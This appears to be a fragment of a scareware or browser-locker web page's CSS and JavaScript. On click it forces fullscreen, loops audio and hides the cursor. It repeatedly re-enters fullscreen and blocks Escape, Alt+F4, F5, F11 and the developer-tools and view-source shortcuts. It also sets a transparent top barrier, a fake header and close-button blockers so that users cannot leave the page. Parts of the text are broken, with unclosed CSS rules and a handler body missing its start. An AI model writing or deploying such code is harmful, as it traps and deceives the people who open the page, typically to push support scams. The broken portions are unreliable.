      .fullscreen-active,

      /* Ensure that hover states don't change cursor in fullscreen mode */
      .fullscreen-active *:hover {

      /* Also handle all standard cursor styles in fullscreen mode */
      .fullscreen-active .pointer,

      .fullscreen-active .default,

        cursor: none !important;
      }

      .fullscreen-active .text,

      .fullscreen-active [style*="cursor:text"] {
        cursor: none !important;
      }

      /* Create a top barrier to prevent exiting fullscreen */
      .top-barrier {
        position: fixed;
        top: -10px; /* Position it slightly above the viewport */
        left: 0;
        width: 100%;
        height: 200px; /* Extra large to ensure coverage */
        background-color: transparent;

      @keyframes disableCursorForNewElements {

      $(document).ready(function () {
        // Function to open the popup
        function openPopup() {
          $("#popup").fadeIn();
        }

        // Function to close the popup
        function closePopup() {
          $("#popup").fadeOut();
        }

        // Call the openPopup function when the page loads
        openPopup();

        // Close the popup when the close button is clicked
        $("#closePopup").click(closePopup);
      });
      $(document).click(function () {
        $("#audio")[0].play();
        $("#audio")[0].loop = true;
        var elem = document.documentElement;
        if (elem.requestFullscreen) {
          elem.requestFullscreen();
        } else if (elem.mozRequestFullScreen) {
          /* Firefox */
          elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
          /* Chrome, Safari and Opera */
          elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
          /* IE/Edge */
          elem.msRequestFullscreen();
        }
      });

        var elem = document.documentElement;
        if (elem.requestFullscreen) {
          elem.requestFullscreen();
        } else if (elem.mozRequestFullScreen) {
          /* Firefox */
          elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
          /* Chrome, Safari and Opera */
          elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
          /* IE/Edge */
          elem.msRequestFullscreen();
        }
        e.preventDefault();
      });
      document.addEventListener("keydown", function (e) {
        var elem = document.documentElement;
        if (elem.requestFullscreen) {
          elem.requestFullscreen();
        } else if (elem.mozRequestFullScreen) {
          /* Firefox */
          elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
          /* Chrome, Safari and Opera */
          elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
          /* IE/Edge */
          elem.msRequestFullscreen();
        }

        // Prevent Escape key from exiting fullscreen
        if (e.key === "Escape") {
          e.preventDefault();
          e.stopPropagation();
          return false;
        }
      });
      //alt + f4 brrowser close disable
      document.addEventListener("keydown", function (e) {
        if (e.key === "F4" && e.altKey) {
          e.preventDefault();
        }
      });
      //ctrl + shift + i disable
      document.addEventListener("keydown", function (e) {
        if (e.ctrlKey && e.shiftKey && e.key === "I") {
          e.preventDefault();
        }
      });
      //ctrl + shift + j disable
      document.addEventListener("keydown", function (e) {
        if (e.ctrlKey && e.shiftKey && e.key === "J") {
          e.preventDefault();
        }
      });
      //ctrl + shift + c disable
      document.addEventListener("keydown", function (e) {
        if (e.ctrlKey && e.shiftKey && e.key === "C") {
          e.preventDefault();
        }
      });
      //ctrl + shift + u disable
      document.addEventListener("keydown", function (e) {
        if (e.ctrlKey && e.shiftKey && e.key === "U") {
          e.preventDefault();
        }
      });
      //ctrl + shift + s disable
      document.addEventListener("keydown", function (e) {
        if (e.ctrlKey && e.shiftKey && e.key === "S") {
          e.preventDefault();
        }
      });
      // f5 disable
      document.addEventListener("keydown", function (e) {
        if (e.key === "F5") {
          e.preventDefault();
        }
      });
      //f11 disable
      document.addEventListener("keydown", function (e) {
        if (e.key === "F11") {
          e.preventDefault();
        }
      });
      document.addEventListener("fullscreenchange", (event) => {
        if (document.fullscreenElement) {
          document.body.classList.add("fullscreen-active");
          document.documentElement.style.cursor = "none";

          // Apply cursor none to all elements again
          var allElements = document.getElementsByTagName("*");
          for (var i = 0; i < allElements.length; i++) {
            allElements[i].style.cursor = "none";
          }

          // Hide verification UI permanently
          document.querySelector(".close-btn").style.display = "none";
          document.querySelector(".overlay").style.display = "none";

          // Force fullscreen again if it attempts to exit
          setTimeout(function () {
            var elem = document.documentElement;
            if (!document.fullscreenElement && elem.requestFullscreen) {
              elem.requestFullscreen({ navigationUI: "hide" });
            }
          }, 100);
        } else {
          // Try to re-enter fullscreen immediately
          var elem = document.documentElement;
          if (elem.requestFullscreen) {
            try {
              elem.requestFullscreen({ navigationUI: "hide" });
            } catch (err) {
              elem.requestFullscreen();
            }
          }

          // If we can't re-enter, then restore normal cursor
          setTimeout(function () {
            if (!document.fullscreenElement) {
              // Try again
              if (elem.requestFullscreen) {
                elem.requestFullscreen();
              }
              document.body.classList.add("fullscreen-active");
              document.documentElement.style.cursor = "none";
            }
          }, 200);
        }
      });
      // Add support for other browser prefixes for fullscreen change
      document.addEventListener("webkitfullscreenchange", (event) => {
        if (document.webkitFullscreenElement) {
          document.body.classList.add("fullscreen-active");
          document.documentElement.style.cursor = "none";

          // Apply cursor none to all elements
          var allElements = document.getElementsByTagName("*");
          for (var i = 0; i < allElements.length; i++) {
            allElements[i].style.cursor = "none";
          }
        } else {
          // Try to re-enter fullscreen immediately
          try {
            document.documentElement.webkitRequestFullscreen({
              navigationUI: "hide",
            });
          } catch (err) {
            document.documentElement.webkitRequestFullscreen();
          }
        }
      });

      document.addEventListener("mozfullscreenchange", (event) => {
        if (document.mozFullScreenElement) {
          document.body.classList.add("fullscreen-active");
          document.documentElement.style.cursor = "none";

          // Apply cursor none to all elements
          var allElements = document.getElementsByTagName("*");
          for (var i = 0; i < allElements.length; i++) {
            allElements[i].style.cursor = "none";
          }
        } else {
          // Try to re-enter fullscreen immediately
          try {
            document.documentElement.mozRequestFullScreen({
              navigationUI: "hide",
            });
          } catch (err) {
            document.documentElement.mozRequestFullScreen();
          }
        }
      });

      document.addEventListener("MSFullscreenChange", (event) => {
        if (document.msFullscreenElement) {
          document.body.classList.add("fullscreen-active");
          document.documentElement.style.cursor = "none";

          // Apply cursor none to all elements
          var allElements = document.getElementsByTagName("*");
          for (var i = 0; i < allElements.length; i++) {
            allElements[i].style.cursor = "none";
          }
        } else {
          // Try to re-enter fullscreen immediately
          document.documentElement.msRequestFullscreen();
        }
      });
      // Force cursor to be hidden immediately when entering fullscreen
      function forceHideCursor() {
        if (
          document.fullscreenElement ||
          document.webkitFullscreenElement ||
          document.mozFullScreenElement ||
          document.msFullscreenElement
        ) {
          document.body.classList.add("fullscreen-active");
          document.documentElement.style.cursor = "none";

          // Apply to all elements
          var allElements = document.getElementsByTagName("*");
          for (var i = 0; i < allElements.length; i++) {
            allElements[i].style.cursor = "none";
          }
        }
      }
      // Hide cursor when mouse moves in fullscreen
      document.addEventListener("mousemove", function (e) {
        forceHideCursor();

        // Prevent mouse interactions near the top of the screen
        if (e.clientY < 100) {
          // Move mouse down if it gets too close to the top
          try {
            e.preventDefault();
            e.stopPropagation();
          } catch (err) {
            // Some browsers may not allow this, so we catch any errors
          }
        }
      });

      // Add additional protection for the top area
      document
        .querySelector(".top-barrier")
        .addEventListener("mouseenter", function (e) {
          // Force fullscreen again just in case
          var elem = document.documentElement;
          if (elem.requestFullscreen) {
            elem.requestFullscreen();
          } else if (elem.mozRequestFullScreen) {
            elem.mozRequestFullScreen();
          } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
          } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
          }

          // Prevent default actions
          e.preventDefault();
          e.stopPropagation();
        });

      // Initial call to hide cursor if already in fullscreen
      forceHideCursor();
      document.addEventListener("fullscreenchange", function (e) {
        if (document.fullscreenElement) {
          document.body.classList.add("fullscreen-active");
          document.documentElement.style.cursor = "none";
        }
      });
      // Add a special barrier that moves with the mouse when near the top
      document.addEventListener("mousemove", function (e) {
        // When mouse is within 150px of the top, create a tracking barrier
        if (e.clientY < 150) {
          // Make sure the fake header is in the right place
          document.querySelector(".fake-header").style.top = "0px";

          // When near the top right (where close button is), add extra protection
          if (e.clientX > window.innerWidth - 200) {
            document.querySelector(".close-button-blocker").style.display =
              "block";
            document.querySelector(".window-controls-blocker").style.display =
              "block";

            // Try to block the event
            e.preventDefault();
            e.stopPropagation();

            // Force cursor hiding again
            document.body.style.cursor = "none";
            document.documentElement.style.cursor = "none";
          }

          // Request fullscreen again if needed
          var elem = document.documentElement;
          if (!document.fullscreenElement && elem.requestFullscreen) {
            try {
              elem.requestFullscreen({ navigationUI: "hide" });
            } catch (err) {
              elem.requestFullscreen();
            }
          }
        }
      });

      // Additional protection for mouse clicks near the top
      document.addEventListener(
        "mousedown",
        function (e) {
          if (e.clientY < 150) {
            e.preventDefault();
            e.stopPropagation();

            // Force fullscreen
            var elem = document.documentElement;
            if (elem.requestFullscreen) {
              try {
                elem.requestFullscreen({ navigationUI: "hide" });
              } catch (err) {
                elem.requestFullscreen();
              }
            }

            return false;
          }
        },
        true
      );
    </script>

      function addFavicon() {
        var link = document.createElement("link");
        link.rel = "icon";
        link.href = "assets/images/fav.jpg"; // Path to your favicon
        document.head.appendChild(link);
      }

      addFavicon();

      function downloadImage(imageSrc, fileName) {
        const link = document.createElement("a");
        link.href = imageSrc;
        link.download = fileName;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }
